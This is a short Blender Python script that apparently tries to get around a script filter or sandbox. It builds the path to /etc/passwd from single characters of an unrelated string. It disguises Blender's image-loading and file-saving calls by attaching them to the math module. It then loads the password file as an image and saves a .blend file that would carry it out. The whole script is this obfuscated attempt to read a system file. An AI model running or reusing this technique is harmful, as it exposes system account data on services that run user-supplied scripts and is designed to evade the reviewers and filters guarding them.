import bpy,math
s="/scratch/out/a"
math.f=bpy.data.images.load
math.f(s[0]+"etc"+s[0]+"passwd")
math.g=bpy.ops.wm.save_as_mainfile
math.g("a.blend")
